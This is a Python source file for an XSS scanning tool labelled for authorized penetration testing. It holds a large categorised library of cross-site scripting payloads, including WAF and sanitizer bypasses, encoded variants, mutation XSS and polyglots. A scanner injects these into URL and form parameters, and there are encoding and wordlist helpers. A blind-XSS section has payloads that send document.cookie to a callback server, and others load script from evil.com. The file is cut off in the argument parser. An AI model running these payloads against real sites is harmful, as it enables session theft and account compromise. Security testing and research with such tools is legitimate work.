#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║              XSS-PROBE — Professional XSS Testing Tool          ║
║         For authorized penetration testing use only             ║
║                        Made by XEON                             ║
╚══════════════════════════════════════════════════════════════════╝

Usage:
  python xss_tester.py -u <URL> [options]
  python xss_tester.py --decode "<encoded_payload>"
  python xss_tester.py --encode "<payload>" [--encode-method <method>]
  python xss_tester.py --list-categories
"""

import argparse
import base64
import urllib.parse
import html
import sys
import time
import json
import re
import random
import string
from itertools import product as iproduct
from datetime import datetime

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# ─────────────────────────────────────────────────────────────────
# ANSI Colors
# ─────────────────────────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"

def banner():
    print(f"""{C.CYAN}{C.BOLD}
  ██╗  ██╗███████╗███████╗      ██████╗ ██████╗  ██████╗ ██████╗ ███████╗
  ╚██╗██╔╝██╔════╝██╔════╝      ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝
   ╚███╔╝ ███████╗███████╗█████╗██████╔╝██████╔╝██║   ██║██████╔╝█████╗  
   ██╔██╗ ╚════██║╚════██║╚════╝██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝  
  ██╔╝ ██╗███████║███████║      ██║     ██║  ██║╚██████╔╝██████╔╝███████╗
  ╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
{C.RESET}{C.DIM}  Professional XSS Testing Framework | Made by XEON
  For authorized penetration testing and security research only{C.RESET}
""")

# ─────────────────────────────────────────────────────────────────
# PAYLOAD LIBRARY
# ─────────────────────────────────────────────────────────────────
class PayloadLibrary:
    """
    Comprehensive XSS payload library organized by category.
    Each category targets specific bypass techniques or injection contexts.
    """

    CATEGORIES = {

        # ── 1. Classic / Basic ───────────────────────────────────
        "classic": [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<Script>alert('XSS')</Script>",
            "<script >alert('XSS')</script>",
            "<script	>alert('XSS')</script>",
            "';alert('XSS')//",
            "\";alert('XSS')//",
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>eval('al'+'ert(1)')</script>",
            "<script>window['alert'](1)</script>",
            "<script>this['alert'](1)</script>",
            "<script>setTimeout('alert(1)',0)</script>",
            "<script>setInterval('alert(1)',9999)</script>",
            "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        ],

        # ── 2. Event Handler Injections ──────────────────────────
        "event_handlers": [
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=\"alert('XSS')\">",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<img src=1 onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<svg onload=\"alert('XSS')\">",
            "<body onload=alert(1)>",
            "<body onpageshow=alert(1)>",
            "<body onfocus=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<input onblur=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<video src=x onerror=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<div onclick=alert(1)>click</div>",
            "<div onmouseover=alert(1)>hover</div>",
            "<a href='#' onmouseover=alert(1)>hover</a>",
            "<form><button formaction=javascript:alert(1)>",
            "<input type=submit formaction=javascript:alert(1)>",
            "<object onerror=alert(1)>",
            "<isindex type=image src=1 onerror=alert(1)>",
        ],

        # ── 3. JavaScript URI / Anchor ───────────────────────────
        "javascript_uri": [
            "<a href=javascript:alert(1)>click</a>",
            "<a href=\"javascript:alert(1)\">click</a>",
            "<a href='javascript:alert(1)'>click</a>",
            "<a href=javascript:alert('XSS')>click</a>",
            "<a href=javascript:void(0) onclick=alert(1)>click</a>",
            "<a href=JaVaScRiPt:alert(1)>click</a>",
            "<a href=&#106;avascript:alert(1)>click</a>",
            "<a href=javascript&#58;alert(1)>click</a>",
            "<a href=\"javascript:alert&#40;1&#41;\">click</a>",
            "<iframe src=javascript:alert(1)>",
            "<iframe src=javascript:alert('XSS')>",
            "<form action=javascript:alert(1)><input type=submit>",
            "<math><a xlink:href=javascript:alert(1)>X</a></math>",
        ],

        # ── 4. HTML5 / New Elements ──────────────────────────────
        "html5": [
            "<svg><script>alert(1)</script></svg>",
            "<svg><script>alert&lpar;1&rpar;</script></svg>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<svg><set onbegin=alert(1) attributeName=x>",
            "<svg><handler xmlns:ev='http://www.w3.org/2001/xml-events' ev:event='load'>alert(1)</handler>",
            "<math><maction actiontype='statusline#' xlink:href='javascript:alert(1)'>X</maction>",
            "<video width=100% onmouseover=alert(1)><source></video>",
            "<canvas onmouseover=alert(1)></canvas>",
            "<picture><source onerror=alert(1)></picture>",
            "<template><script>alert(1)</script></template>",
            "<slot onslotchange=alert(1)>",
        ],

        # ── 5. Filter Bypass — Case / Whitespace ─────────────────
        "case_bypass": [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<SCRIPT SRC=//evil.com/xss.js></SCRIPT>",
            "<%00script>alert(1)</%00script>",
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "<scr\tipt>alert(1)</scr\tipt>",
            "<script/xss>alert(1)</script>",
            "<script\n>alert(1)</script>",
            "<IMG SRC=x OnErRoR=alert(1)>",
            "<IMG SRC=x onerror\n=alert(1)>",
            "<IMG SRC=x onerror =alert(1)>",
            "<<script>alert(1)//<</script>",
            "<script>/*<script>*/alert(1)/*</script>*/</script>",
        ],

        # ── 6. Encoding — HTML Entities ──────────────────────────
        "html_entity": [
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            "<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            "<a href='&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>click</a>",
            "&#0000060script&#0000062alert(1)&#0000060/script&#0000062",
        ],

        # ── 7. URL Encoding ──────────────────────────────────────
        "url_encoded": [
            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
            "%3Csvg%20onload%3Dalert(1)%3E",
            "%3Ca%20href%3Djavascript%3Aalert(1)%3Eclick%3C%2Fa%3E",
            "<a href=%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29>click</a>",
            "<img src=x onerror=%61%6C%65%72%74%281%29>",
        ],

        # ── 8. Double Encoding ───────────────────────────────────
        "double_encoded": [
            "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
            "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",
            "%2526lt%253Bscript%2526gt%253Balert(1)%2526lt%253B%252Fscript%2526gt%253B",
        ],

        # ── 9. Base64 Encoded ────────────────────────────────────
        "base64": [
            "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
            "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
            "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
            "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
        ],

        # ── 10. Unicode / UTF-8 Bypass ───────────────────────────
        "unicode": [
            "\u003cscript\u003ealert(1)\u003c/script\u003e",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
            "<script>\u0061\u006c\u0065\u0072\u0074(1)</script>",
            "<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>",
            "＜script＞alert(1)＜/script＞",
        ],

        # ── 11. DOM-Based XSS ────────────────────────────────────
        "dom_based": [
            "#<script>alert(1)</script>",
            "#<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "?search=<script>alert(1)</script>",
            "#\"><img src=x onerror=alert(1)>",
            "document.location='javascript:alert(1)'",
            "location.hash.slice(1)",
            "document.write(location.hash)",
            "eval(location.hash.slice(1))",
        ],

        # ── 12. Attribute Context Injection ─────────────────────
        "attribute_context": [
            "\" onmouseover=\"alert(1)",
            "' onmouseover='alert(1)",
            "\" autofocus onfocus=\"alert(1)",
            "' autofocus onfocus='alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "\" style=\"xss:expression(alert(1))",
            "' style='xss:expression(alert(1))",
            "\"><img src=x onerror=alert(1)>",
            "\" tabindex=1 onfocus=alert(1) autofocus=\"",
            "\" accesskey=x onclick=alert(1) x=\"",
        ],

        # ── 13. CSS / Style Injection ────────────────────────────
        "css_injection": [
            "<style>*{background:url('javascript:alert(1)')}</style>",
            "<style>@import 'javascript:alert(1)';</style>",
            "<div style=\"background:url('javascript:alert(1)')\">",
            "<div style=\"expression(alert(1))\">",
            "<x style=\"behavior:url(#default#time2)\" onbegin=alert(1)>",
            "<link rel=stylesheet href=data:css,*{xss:expression(alert(1))}>",
            "<style>a{color:red}@keyframes x{}</style><a style=animation-name:x onanimationstart=alert(1)>",
        ],

        # ── 14. Template Literal / ES6 ───────────────────────────
        "es6_template": [
            "<script>`${alert(1)}`</script>",
            "<script>tag`${alert(1)}`</script>",
            "<script>Function('alert(1)')()</script>",
            "<script>new Function('alert(1)')()</script>",
            "<script>Reflect.apply(alert,window,[1])</script>",
            "<script>[].constructor.constructor('alert(1)')()</script>",
            "<script>[]['filter']['constructor']('alert(1)')()</script>",
            "<script>({})['constructor']['constructor']('alert(1)')()</script>",
        ],

        # ── 15. Prototype Pollution / Object Injection ───────────
        "prototype_pollution": [
            "__proto__[onerror]=alert(1)",
            "constructor[prototype][onerror]=alert(1)",
            "{\"__proto__\":{\"innerHTML\":\"<script>alert(1)</script>\"}}",
            "__proto__.innerHTML=<img src=x onerror=alert(1)>",
        ],

        # ── 16. Script Src / Remote Payload ─────────────────────
        "remote_src": [
            "<script src=//evil.com/xss.js>",
            "<script src=//evil.com/xss.js></script>",
            "<script src=data:,alert(1)></script>",
            "<script src=data:text/javascript,alert(1)></script>",
            "<script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js></script>",
        ],

        # ── 17. WAF / Sanitizer Bypass Techniques ───────────────
        "waf_bypass": [
            "<scr<script>ipt>alert(1)</scr<script>ipt>",
            "<img src=\"`\"><script>alert(1)</script>\">",
            "<img src=`javascript:alert(1)`>",
            "<img \"\"\"><script>alert(1)</script>\">",
            "<IMG DYNSRC=\"javascript:alert(1)\">",
            "<IMG LOWSRC=\"javascript:alert(1)\">",
            "<BGSOUND SRC=\"javascript:alert(1)\">",
            "<TABLE BACKGROUND=\"javascript:alert(1)\">",
            "<TABLE><TD BACKGROUND=\"javascript:alert(1)\">",
            "<DIV STYLE=\"background-image: url(javascript:alert(1))\">",
            "<DIV STYLE=\"width: expression(alert(1))\">",
            "<IMG STYLE=\"xss:expr/*XSS*/ession(alert(1))\">",
            "</title><script>alert(1)</script>",
            "</textarea><script>alert(1)</script>",
            "</noscript><script>alert(1)</script>",
            "--><script>alert(1)</script>",
            "]]><script>alert(1)</script>",
            "<![CDATA[<script>alert(1)</script>]]>",
        ],

        # ── 18. JSON / API Context ───────────────────────────────
        "json_context": [
            "{\"key\":\"<script>alert(1)</script>\"}",
            "{\"key\":\"\\u003cscript\\u003ealert(1)\\u003c\\/script\\u003e\"}",
            "{\"key\":\"</script><script>alert(1)</script>\"}",
            "{\"callback\":\"alert(1)\"}",
            "{\"key\":\"<img src=x onerror=alert(1)>\"}",
        ],

        # ── 19. Polyglot Payloads ────────────────────────────────
        "polyglot": [
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\"()<script>alert(1)</script>",
            "<script>alert(1)</script><script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>\"",
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "<!--<script>alert(1)--></script>-->",
            "';!--\"<XSS>=&{()}alert(1)",
        ],

        # ── 20. Mutation XSS (mXSS) ──────────────────────────────
        "mutation_xss": [
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            "<listing><\x00script>alert(1)</script>",
            "<style><img src=\"</style><img src=x onerror=alert(1)>\">",
            "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
            "<table><tbody><tr><td><noscript><p></td></tr></tbody></table><img src=x onerror=alert(1)>",
        ],

        # ── 21. Blind XSS Payloads ───────────────────────────────
        "blind_xss": [
            "\"><script src=//YOUR-CALLBACK-SERVER/xss.js></script>",
            "javascript:fetch('//YOUR-CALLBACK-SERVER/?c='+document.cookie)",
            "<img src=x onerror=\"fetch('//YOUR-CALLBACK-SERVER/?c='+document.cookie)\">",
            "<script>new Image().src='//YOUR-CALLBACK-SERVER/?c='+document.cookie</script>",
            "<script>document.location='//YOUR-CALLBACK-SERVER/?c='+document.cookie</script>",
            "<script>navigator.sendBeacon('//YOUR-CALLBACK-SERVER',document.cookie)</script>",
        ],

        # ── 22. XSS via File Upload ──────────────────────────────
        "file_upload": [
            "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>",
            "<html><body><script>alert(1)</script></body></html>",
            "GIF89a<script>alert(1)</script>",
            "AAAA<script>alert(1)</script>",
        ],

        # ── 23. AngularJS Template Injection ─────────────────────
        "angular": [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{7*7}}{{alert(1)}}",
            "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
            "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('x=alert(1)')}}",
        ],

        # ── 24. Vue.js Template Injection ─────────────────────────
        "vuejs": [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$el.ownerDocument.defaultView.alert(1)}}",
            "v-on:click=\"alert(1)\"",
            ":href=\"'javascript:alert(1)'\"",
        ],

        # ── 25. React / JSX Injection ────────────────────────────
        "react": [
            "dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}}",
            "href=\"javascript:alert(1)\"",
            "onError=\"{() => alert(1)}\"",
        ],

        # ── 26. Self-Closing Tags ────────────────────────────────
        "self_closing": [
            "<script/>alert(1)</script>",
            "<img src=x:alert(1) onerror=eval(src)>",
            "<br/onmouseover=alert(1)>",
            "<input/onmouseover=alert(1)>",
        ],

        # ── 27. Hex Encoding ─────────────────────────────────────
        "hex_encoded": [
            "<script>alert('\x58\x53\x53')</script>",
            "<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>",
            "<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>",
        ],

        # ── 28. Octal Encoding ───────────────────────────────────
        "octal_encoded": [
            "<script>eval('\\141\\154\\145\\162\\164\\50\\61\\51')</script>",
        ],

        # ── 29. Iframe-Based ─────────────────────────────────────
        "iframe": [
            "<iframe onload=alert(1)>",
            "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "<iframe src=javascript:alert(1)>",
        ],

        # ── 30. CDATA Bypass ─────────────────────────────────────
        "cdata": [
            "<![CDATA[<]]><script>alert(1)</script>",
            "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>",
        ],
    }

    @classmethod
    def get_all(cls):
        all_payloads = []
        for cat, payloads in cls.CATEGORIES.items():
            for p in payloads:
                all_payloads.append({"category": cat, "payload": p})
        return all_payloads

    @classmethod
    def get_by_category(cls, category):
        return cls.CATEGORIES.get(category, [])

    @classmethod
    def list_categories(cls):
        return list(cls.CATEGORIES.keys())


# ─────────────────────────────────────────────────────────────────
# ENCODER / DECODER ENGINE
# ─────────────────────────────────────────────────────────────────
class EncoderDecoder:
    """Multi-format payload encoder and decoder."""

    ENCODING_MAP = {
        "url":           ("URL Encode",          lambda s: urllib.parse.quote(s, safe='')),
        "url_plus":      ("URL Encode (+ space)", lambda s: urllib.parse.quote_plus(s)),
        "double_url":    ("Double URL Encode",    lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')),
        "html_entity":   ("HTML Entities",        lambda s: html.escape(s, quote=True)),
        "html_decimal":  ("HTML Decimal",         lambda s: ''.join(f'&#{ord(c)};' for c in s)),
        "html_hex":      ("HTML Hex",             lambda s: ''.join(f'&#x{ord(c):X};' for c in s)),
        "base64":        ("Base64",               lambda s: base64.b64encode(s.encode()).decode()),
        "base64_url":    ("Base64 URL-safe",      lambda s: base64.urlsafe_b64encode(s.encode()).decode()),
        "unicode_escape":("Unicode Escape",       lambda s: s.encode('unicode_escape').decode()),
        "hex_escape":    ("Hex Escape",           lambda s: ''.join(f'\\x{ord(c):02x}' for c in s)),
        "octal_escape":  ("Octal Escape",         lambda s: ''.join(f'\\{ord(c):03o}' for c in s)),
        "charcode":      ("JS charCodeAt Array",  lambda s: f"String.fromCharCode({','.join(str(ord(c)) for c in s)})"),
        "js_unescape":   ("JS unescape()",        lambda s: f"unescape('{urllib.parse.quote(s, safe='')}')"),
    }

    DECODING_MAP = {
        "url":          ("URL Decode",      lambda s: urllib.parse.unquote(s)),
        "url_plus":     ("URL+ Decode",     lambda s: urllib.parse.unquote_plus(s)),
        "html_entity":  ("HTML Unescape",   lambda s: html.unescape(s)),
        "base64":       ("Base64 Decode",   EncoderDecoder._safe_base64_decode if False else None),  # set below
        "base64_url":   ("Base64-URL Decode", None),  # set below
        "unicode_escape":("Unicode Unescape", lambda s: s.encode().decode('unicode_escape')),
    }

    @staticmethod
    def _safe_base64_decode(s):
        try:
            return base64.b64decode(s + '==').decode('utf-8', errors='replace')
        except Exception:
            return "[decode error]"

    @staticmethod
    def _safe_base64url_decode(s):
        try:
            return base64.urlsafe_b64decode(s + '==').decode('utf-8', errors='replace')
        except Exception:
            return "[decode error]"

    @classmethod
    def _fix_decoders(cls):
        cls.DECODING_MAP["base64"] = ("Base64 Decode", cls._safe_base64_decode)
        cls.DECODING_MAP["base64_url"] = ("Base64-URL Decode", cls._safe_base64url_decode)

    @classmethod
    def encode(cls, payload, encoding):
        entry = cls.ENCODING_MAP.get(encoding)
        if not entry:
            return None, f"Unknown encoding: {encoding}"
        name, fn = entry
        try:
            return fn(payload), name
        except Exception as e:
            return None, str(e)

    @classmethod
    def decode(cls, payload, encoding=None):
        """Auto-decode or decode with specified method."""
        cls._fix_decoders()
        results = {}
        targets = [encoding] if encoding else list(cls.DECODING_MAP.keys())
        for key in targets:
            entry = cls.DECODING_MAP.get(key)
            if not entry:
                continue
            name, fn = entry
            if fn is None:
                continue
            try:
                decoded = fn(payload)
                if decoded != payload:
                    results[name] = decoded
            except Exception as e:
                results[f"{name} (error)"] = str(e)
        return results

    @classmethod
    def encode_all(cls, payload):
        results = {}
        for key, (name, fn) in cls.ENCODING_MAP.items():
            try:
                results[name] = fn(payload)
            except Exception as e:
                results[name] = f"[error: {e}]"
        return results


# ─────────────────────────────────────────────────────────────────
# RESULT TRACKING
# ─────────────────────────────────────────────────────────────────
class ScanResult:
    def __init__(self):
        self.payloads_tested = 0
        self.findings = []
        self.errors = []
        self.start_time = datetime.now()

    def add_finding(self, url, param, payload, category, status_code, evidence=""):
        self.findings.append({
            "url": url,
            "param": param,
            "payload": payload,
            "category": category,
            "status_code": status_code,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat(),
        })

    def summary(self):
        elapsed = (datetime.now() - self.start_time).total_seconds()
        return {
            "scan_duration_seconds": round(elapsed, 2),
            "payloads_tested": self.payloads_tested,
            "findings_count": len(self.findings),
            "findings": self.findings,
            "errors": self.errors,
        }


# ─────────────────────────────────────────────────────────────────
# HTTP SESSION BUILDER
# ─────────────────────────────────────────────────────────────────
def build_session(timeout=10, proxy=None, verify_ssl=True):
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.5)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": "XSS-Probe/1.0 (Authorized Security Test | XEON)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    session.verify = verify_ssl
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


# ─────────────────────────────────────────────────────────────────
# REFLECTION DETECTOR
# ─────────────────────────────────────────────────────────────────
REFLECTION_MARKERS = [
    "<script", "onerror=", "onload=", "onclick=", "onfocus=",
    "javascript:", "alert(", "alert&#40;", "expression(",
    "svg", "iframe", "onmouseover=", "<img",
]

def check_reflection(response_text, payload):
    """Check if payload or key indicators are reflected in the response."""
    text_lower = response_text.lower()
    payload_lower = payload.lower()

    # Direct reflection
    if payload_lower in text_lower:
        return True, "direct_reflection"

    # URL-decoded reflection
    decoded = urllib.parse.unquote(payload_lower)
    if decoded in text_lower and decoded != payload_lower:
        return True, "url_decoded_reflection"

    # HTML-unescaped reflection
    unescaped = html.unescape(payload_lower)
    if unescaped in text_lower and unescaped != payload_lower:
        return True, "html_unescaped_reflection"

    # Partial marker check
    for marker in REFLECTION_MARKERS:
        if marker in payload_lower and marker in text_lower:
            return True, f"partial_marker({marker})"

    return False, None


# ─────────────────────────────────────────────────────────────────
# SCANNER CORE
# ─────────────────────────────────────────────────────────────────
def extract_params(url):
    """Extract query parameters from URL."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return {k: v[0] for k, v in params.items()}, parsed

def build_test_url(parsed, params, param_name, payload):
    """Inject payload into a specific parameter."""
    modified = dict(params)
    modified[param_name] = payload
    new_query = urllib.parse.urlencode(modified)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))

def scan(url, categories=None, delay=0, timeout=10, proxy=None,
         verify_ssl=True, headers=None, cookies=None,
         method="GET", post_data=None, verbose=False):

    if not REQUESTS_AVAILABLE:
        print(f"{C.RED}[!] 'requests' library not installed. Run: pip install requests{C.RESET}")
        sys.exit(1)

    result = ScanResult()
    session = build_session(timeout=timeout, proxy=proxy, verify_ssl=verify_ssl)

    if headers:
        for h in headers:
            k, _, v = h.partition(":")
            session.headers[k.strip()] = v.strip()

    if cookies:
        for c in cookies:
            k, _, v = c.partition("=")
            session.cookies.set(k.strip(), v.strip())

    # Build payload list
    if categories:
        payloads = []
        for cat in categories:
            for p in PayloadLibrary.get_by_category(cat):
                payloads.append({"category": cat, "payload": p})
    else:
        payloads = PayloadLibrary.get_all()

    params, parsed = extract_params(url)
    if not params and method == "GET":
        print(f"{C.YELLOW}[!] No query parameters found in URL. Testing full URL injection.{C.RESET}")

    total = len(payloads) * max(len(params), 1)
    print(f"{C.CYAN}[*] Loaded {len(payloads)} payloads across "
          f"{len(PayloadLibrary.list_categories())} categories{C.RESET}")
    print(f"{C.CYAN}[*] Parameters to test: {list(params.keys()) or ['(body)']} | "
          f"Total tests: {total}{C.RESET}")
    print(f"{C.DIM}{'─'*70}{C.RESET}\n")

    tested = 0

    for param_name in (params.keys() if params else ["__body__"]):
        for item in payloads:
            payload = item["payload"]
            category = item["category"]
            result.payloads_tested += 1
            tested += 1

            try:
                if method == "GET":
                    if params:
                        test_url = build_test_url(parsed, params, param_name, payload)
                        resp = session.get(test_url, timeout=timeout)
                    else:
                        resp = session.get(url + payload, timeout=timeout)
                else:
                    data = dict(post_data) if post_data else {}
                    data[param_name] = payload
                    resp = session.post(url, data=data, timeout=timeout)

                reflected, evidence = check_reflection(resp.text, payload)

                if reflected:
                    result.add_finding(
                        url=resp.url,
                        param=param_name,
                        payload=payload,
                        category=category,
                        status_code=resp.status_code,
                        evidence=evidence,
                    )
                    print(f"{C.GREEN}{C.BOLD}[✔ REFLECTED]{C.RESET} "
                          f"{C.YELLOW}[{category}]{C.RESET} "
                          f"Param: {C.CYAN}{param_name}{C.RESET} | "
                          f"Evidence: {C.MAGENTA}{evidence}{C.RESET}")
                    if verbose:
                        print(f"    {C.DIM}Payload: {payload[:80]}{'...' if len(payload)>80 else ''}{C.RESET}")
                else:
                    if verbose:
                        print(f"{C.DIM}[-] [{category}] {param_name}: "
                              f"{payload[:60]}{'...' if len(payload)>60 else ''}{C.RESET}")

                # Progress indicator
                if tested % 50 == 0:
                    pct = (tested / total) * 100
                    bar = "█" * int(pct // 5) + "░" * (20 - int(pct // 5))
                    print(f"\r{C.DIM}  Progress: [{bar}] {pct:.1f}% ({tested}/{total}){C.RESET}", end="")

            except requests.exceptions.RequestException as e:
                result.errors.append({"param": param_name, "payload": payload, "error": str(e)})
                if verbose:
                    print(f"{C.RED}[!] Request error: {e}{C.RESET}")

            if delay:
                time.sleep(delay)

    print(f"\n\n{C.DIM}{'─'*70}{C.RESET}")
    return result


# ─────────────────────────────────────────────────────────────────
# REPORT GENERATOR
# ─────────────────────────────────────────────────────────────────
def print_report(result: ScanResult, output_file=None):
    summary = result.summary()
    print(f"\n{C.BOLD}{C.CYAN}╔══════════════════════════ SCAN REPORT ══════════════════════════╗{C.RESET}")
    print(f"  Duration    : {summary['scan_duration_seconds']}s")
    print(f"  Tested      : {summary['payloads_tested']} payloads")
    print(f"  Reflected   : {C.GREEN if summary['findings_count'] > 0 else C.DIM}"
          f"{summary['findings_count']} potential XSS vectors{C.RESET}")
    print(f"  Errors      : {len(summary['errors'])}")
    print(f"{C.BOLD}{C.CYAN}╚═════════════════════════════════════════════════════════════════╝{C.RESET}\n")

    if summary["findings"]:
        print(f"{C.BOLD}Reflected Payloads:{C.RESET}")
        for i, f in enumerate(summary["findings"], 1):
            print(f"  {C.GREEN}{i:>3}.{C.RESET} [{f['category']}] param={f['param']} | {f['evidence']}")
            print(f"       {C.DIM}Payload: {f['payload'][:100]}{'...' if len(f['payload'])>100 else ''}{C.RESET}")

    if output_file:
        with open(output_file, "w") as fp:
            json.dump(summary, fp, indent=2)
        print(f"\n{C.CYAN}[*] Report saved to: {output_file}{C.RESET}")


# ─────────────────────────────────────────────────────────────────
# DECODE COMMAND
# ─────────────────────────────────────────────────────────────────
def run_decode(payload, encoding=None):
    EncoderDecoder._fix_decoders()
    print(f"\n{C.BOLD}Input:{C.RESET} {payload}\n")
    results = EncoderDecoder.decode(payload, encoding)
    if not results:
        print(f"{C.YELLOW}No decodings produced a different result.{C.RESET}")
        return
    for method_name, decoded in results.items():
        print(f"  {C.CYAN}{method_name:<25}{C.RESET} → {decoded}")
    print()


# ─────────────────────────────────────────────────────────────────
# ENCODE COMMAND
# ─────────────────────────────────────────────────────────────────
def run_encode(payload, encoding=None):
    print(f"\n{C.BOLD}Input:{C.RESET} {payload}\n")
    if encoding:
        result, name = EncoderDecoder.encode(payload, encoding)
        if result:
            print(f"  {C.CYAN}{name:<25}{C.RESET} → {result}")
        else:
            print(f"{C.RED}Error: {name}{C.RESET}")
    else:
        results = EncoderDecoder.encode_all(payload)
        for name, encoded in results.items():
            print(f"  {C.CYAN}{name:<25}{C.RESET} → {encoded}")
    print()


# ─────────────────────────────────────────────────────────────────
# GENERATE PAYLOADS COMMAND
# ─────────────────────────────────────────────────────────────────
def run_generate(category=None, encode=None, limit=None, output_file=None):
    if category:
        raw = PayloadLibrary.get_by_category(category)
        payloads = [{"category": category, "payload": p} for p in raw]
    else:
        payloads = PayloadLibrary.get_all()

    if limit:
        payloads = payloads[:limit]

    lines = []
    for item in payloads:
        p = item["payload"]
        if encode:
            encoded, _ = EncoderDecoder.encode(p, encode)
            p = encoded or p
        lines.append(p)
        print(p)

    if output_file:
        with open(output_file, "w") as fp:
            fp.write("\n".join(lines))
        print(f"\n{C.CYAN}[*] Wordlist saved to: {output_file}{C.RESET}")


# ─────────────────────────────────────────────────────────────────
# ARGPARSE / MAIN
# ─────────────────────────────────────────────────────────────────
def build_parser():
    parser = argparse.ArgumentParser(
        prog="xss_tester",
        description="XSS-Probe — Professional XSS Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Scan a URL:
    python xss_tester.py -u "http://target.com/search?q=test"

  Scan with specific categories and delay:
    python xss_tester.py -u "http://target.com/search?q=test" -c classic event_handlers --delay 0.5

  Scan via POST:
    python xss_tester.py -u "http://target.com/login" -m POST -d "username=test&password=test"

  Decode a payload (auto-detect):
    python xss_tester.py --decode "%3Cscript%3Ealert(1)%3C%2Fscript%3E"

  Decode with specific method:
    python xss_tester.py --decode "PHNjcmlwdD4..." --decode-method base64

  Encode a payload:
    python xss_tester.py --encode "<script>alert(1)</script>" --encode-method url

  Encode all ways:
    python xss_tester.py --encode "<script>alert(1)</script>"

  Generate wordlist:
    python xss_tester.py --generate --category waf_bypass --encode-method url -o wordlist.txt

  List payload categories:
    python xss_tester.py --list-categories
"""
    )

    # Scan mode
